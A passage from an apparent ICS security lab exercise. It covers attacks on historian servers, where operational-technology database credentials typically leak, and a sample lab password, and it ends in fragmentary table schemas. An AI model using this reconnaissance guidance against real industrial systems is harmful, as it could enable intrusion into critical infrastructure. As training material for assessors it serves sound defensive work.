  4. Data integrity attacks: modifying historical records can hide evidence of tampering or create false compliance records
  5. Lateral movement: historian servers often have network access to both OT (to collect data) and IT (to serve reports), making them a bridge between zones

docs.title: How Credentials Are Discovered in ICS
docs.text:
In this exercise you will use credentials that were discoverable through earlier reconnaissance. In real ICS environments, database credentials are commonly found in:

  • Documentation servers: internal wikis, Confluence pages, or static HTML docs with connection strings
  • Configuration files: HMI application configs, SCADA project files, or backup scripts
  • Default credentials: many historian installations use vendor defaults that are never changed
  • Shared credentials: the same password reused across multiple OT services

The Credential Chain

The password hex_point_2024 for the historian database follows a common pattern in OT environments: [company]_[year]. Predictable passwords like this are found frequently during ICS assessments because operations teams prioritize uptime over password complexity, and changing credentials risks breaking integrations.

   Column     |            Type             | Nullable |
---------------+-----------------------------+----------+

                                  Table "public.pipeline_readings"
   Column      |            Type             | Nullable |
----------------+-----------------------------+----------+
 id             | integer                     | not null |
